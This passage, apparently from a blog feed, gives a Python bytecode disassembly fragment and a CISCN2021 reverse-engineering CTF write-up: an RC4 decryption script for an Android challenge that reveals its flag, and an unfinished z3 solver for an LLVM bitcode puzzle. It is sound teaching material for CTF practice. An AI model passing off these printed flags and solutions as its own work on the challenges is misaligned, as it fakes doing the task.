                        &lt;span style=&#34;color:#ae81ff&#34;&gt;121&lt;/span&gt;     LOAD_GLOBAL             &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: print_dbg
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;124&lt;/span&gt;     LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dbg: new z is: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;127&lt;/span&gt;     LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: self
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;130&lt;/span&gt;     LOAD_ATTR               &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: z
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;133&lt;/span&gt;     BINARY_MODULO           
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;134&lt;/span&gt;     CALL_FUNCTION           &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;137&lt;/span&gt;     POP_TOP                 
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;138&lt;/span&gt;     LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: self
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;141&lt;/span&gt;     LOAD_ATTR               &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: z
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;144&lt;/span&gt;     LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;None&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;147&lt;/span&gt;     COMPARE_OP              &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;is&lt;/span&gt;)
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;150&lt;/span&gt;     POP_JUMP_IF_FALSE       &lt;span style=&#34;color:#ae81ff&#34;&gt;167&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;153&lt;/span&gt;     LOAD_GLOBAL             &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: print_dbg
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;156&lt;/span&gt;     LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: block function returned error&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;159&lt;/span&gt;     CALL_FUNCTION           &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;162&lt;/span&gt;     POP_TOP                 
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;163&lt;/span&gt;     LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;166&lt;/span&gt;     RETURN_VALUE            
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;167&lt;/span&gt;     LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: self
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;170&lt;/span&gt;     LOAD_ATTR               &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: z
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;173&lt;/span&gt;     LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: self
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;176&lt;/span&gt;     LOAD_ATTR               &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;: checksum
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;179&lt;/span&gt;     LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;: k
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;182&lt;/span&gt;     BINARY_SUBSCR           
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;183&lt;/span&gt;     COMPARE_OP              &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt;)
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;186&lt;/span&gt;     POP_JUMP_IF_FALSE       &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;189&lt;/span&gt;     LOAD_GLOBAL             &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: print_dbg
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;192&lt;/span&gt;     LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;err: incorrect checksum (z=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; tested against checksum[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%d&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&amp;#39;&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;195&lt;/span&gt;     LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: self
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;198&lt;/span&gt;     LOAD_ATTR               &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: z
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;201&lt;/span&gt;     LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;: k
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;204&lt;/span&gt;     LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;: self
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;207&lt;/span&gt;     LOAD_ATTR               &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;: checksum
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;210&lt;/span&gt;     LOAD_FAST               &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;: k
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;213&lt;/span&gt;     BINARY_SUBSCR           
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;214&lt;/span&gt;     BUILD_TUPLE             &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;217&lt;/span&gt;     BINARY_MODULO           
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;218&lt;/span&gt;     CALL_FUNCTION           &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;221&lt;/span&gt;     POP_TOP                 
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;222&lt;/span&gt;     LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;225&lt;/span&gt;     RETURN_VALUE            
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;226&lt;/span&gt;     JUMP_ABSOLUTE           &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;229&lt;/span&gt;     POP_BLOCK               
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;230&lt;/span&gt;     LOAD_CONST              &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;
                        &lt;span style=&#34;color:#ae81ff&#34;&gt;233&lt;/span&gt;     RETURN_VALUE            
                &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Activator.activate&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也没看出来什么问题&lt;/p&gt;
</description>
        </item>
        <item>
        <title>CISCN2021 RE writeup</title>
        <link>/post/ciscn2021-re-writeup/</link>
        <pubDate>Thu, 20 May 2021 01:21:59 +0000</pubDate>
        
        <guid>/post/ciscn2021-re-writeup/</guid>
        <description>&lt;h2 id=&#34;glass&#34;&gt;glass&lt;/h2&gt;
&lt;p&gt;安卓逆向，使用jeb打开，发现在java层仅进行了简单的输入，然后进入so层判断&lt;/p&gt;
&lt;p&gt;用ida打开so层，直接搜索java，进入判断函数&lt;/p&gt;
&lt;p&gt;下面的字符串应该是密钥&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;qmemcpy(v6, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;12345678&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(v6));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后调用了三个函数&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;sub_FFC(v7, v6, v4);
sub_1088(v7, flag, &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;);
sub_10D4(flag, &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;, v6, v4);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;进入查看，第一个是RC4密钥初始化，第二个是RC4加密，第三个是对密文进行简单的运算&lt;/p&gt;
&lt;p&gt;从字符串里拿密文，写脚本进行求解，先对简单运算进行反向运算，然后找个RC4密码的脚本，跑一下就可以找到flag&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;cipher &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0xA3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x69&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xBB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1A&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x84&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x65&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAD&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x9E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x96&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x8E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x4F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xE1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEB&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xAF&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xEA&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xA8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2D&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x42&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xC7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x6E&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xB0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xD3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xCC&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x78&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0xF9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x98&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x3F&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]
key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;0x31&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x33&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x34&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x35&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x36&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x37&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x38&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__rc4_init&lt;/span&gt;(key):
    keylength &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; len(key)
    S &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list(range(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;))
    j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;):
        j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; key[i &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; keylength]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
        S[i], S[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; S[j], S[i]
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; S

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;rc4_crypt&lt;/span&gt;(key, data):
    S &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; __rc4_init(key)
    i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; a &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; data:
        i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
        j &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S[i]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;
        S[i], S[j] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; S[j], S[i]
        k &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (a &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; S[(S[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; S[j]) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;])&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_bytes(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;big&amp;#39;&lt;/span&gt;)
        result &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; k
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; result

&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;convert&lt;/span&gt;(k):
    ret &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
    &lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; k &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;:
        ret&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(k &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xff&lt;/span&gt;)
        k &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ret[::&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]

&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; libnum &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; n2s, s2n

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;):
    cipher[j] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; key[j &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;):
    cipher[j], cipher[j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], cipher[j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; cipher[j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; cipher[j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;], cipher[j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; cipher[j], cipher[j] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; cipher[j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; cipher[j &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;]

print (rc4_crypt(key, cipher))

&lt;span style=&#34;color:#75715e&#34;&gt;# b&amp;#39;CISCN{6654d84617f627c88846c172e0f4d46c}\xec&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;baby_bc&#34;&gt;baby_bc&lt;/h2&gt;
&lt;p&gt;不知道bc文件是什么，用 &lt;code&gt;file&lt;/code&gt; 命令查看，发现是 &lt;code&gt;LLVM ir bitcode&lt;/code&gt; 文件，上网搜索，使用 &lt;code&gt;clang -o baby_bc baby.bc&lt;/code&gt; 搞成 &lt;code&gt;elf&lt;/code&gt; 文件&lt;/p&gt;
&lt;p&gt;拖入ida进行查看&lt;/p&gt;
&lt;p&gt;首先对输入进行判断，分析输入的应该是长度是25的字符串，每个字符都在 &lt;code&gt;0-5&lt;/code&gt; 之间&lt;/p&gt;
&lt;p&gt;要拿到flag需要通过两个验证函数&lt;/p&gt;
&lt;p&gt;第一个函数是将输入填入到map中，map中非零位输入应该为0，零位的输入不能为0&lt;/p&gt;
&lt;p&gt;第二个函数是对map进行验证，分析后发现总共进行了如下验证：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每行的数字不能相同&lt;/li&gt;
&lt;li&gt;每列的数字不能相同&lt;/li&gt;
&lt;li&gt;每行相邻两个数字的大小关系需要符合row矩阵的要求&lt;/li&gt;
&lt;li&gt;每列相邻两个数字的大小关系需要符合col矩阵的要求&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;知道要求后直接上z3约束求解器拿flag&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; z3 &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;

s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Solver()

flag &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [Int(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;flag_&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%i&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i) &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;)]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;):
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[i] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;)

s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
    add_row &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    add_col &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; j &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;):
        add_row &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; flag[i &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; j]
        add_col &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; flag[j &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i]
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(add_row &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;)
    s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(add_col &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;)

s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;])
